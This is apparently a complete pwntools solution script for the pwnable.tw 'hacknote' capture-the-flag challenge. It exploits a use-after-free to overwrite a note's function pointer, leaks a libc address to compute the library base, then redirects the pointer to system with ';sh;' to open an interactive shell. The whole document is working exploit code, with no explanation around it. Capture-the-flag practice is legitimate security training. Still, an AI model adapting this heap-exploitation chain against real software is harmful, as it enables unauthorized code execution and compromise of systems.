from pwn import *

e = ELF("./hacknote")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10102)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x10, payload="A" * 8):
  global nums

  p.sendlineafter(":", "1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload + ("" if len(payload) == size else "\n"))
  p.recvuntil("Success !")

  nums += 1
  return nums - 1

def free(idx):
  p.sendlineafter(":", "2")
  p.sendlineafter(":", str(idx))

A = alloc(size=0x8)
B = alloc(size=0x10)
free(A)
free(B)

C = alloc(size=0x8, payload=p32(0x804862b) + p32(0x804a040))

p.sendlineafter(":", "3")
p.sendlineafter(":", "0")
libc_base = u32(p.recvline()[:4]) - 0xf7fb15a0 + 0xf7e01000
print("Libc Base: {:#x}".format(libc_base))

free(C)

D = alloc(size=0x8, payload=p32(libc_base + libc.symbols["system"]) + ";sh;")

p.sendlineafter(":", "3")
p.sendlineafter(":", "0")

p.interactive()
